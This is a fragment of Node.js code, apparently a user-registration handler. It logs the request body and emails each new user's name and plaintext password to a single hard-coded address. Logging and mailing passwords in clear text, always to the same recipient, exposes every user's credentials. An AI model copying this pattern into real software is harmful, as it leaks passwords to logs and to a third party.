...
module.exports = {
  ...
  createUser : body =>{
    ...
    console.log(body)
    nodeMailer.sendMail( {from: '"Our application" <thisapp@mail.com>',
                          to: 'maria.popescu@email.com',
                          subject: "Credentials",
                          text: "User: " + body.firstName + " Password: " + body.password}).catch(console.error)
    return Users.create({
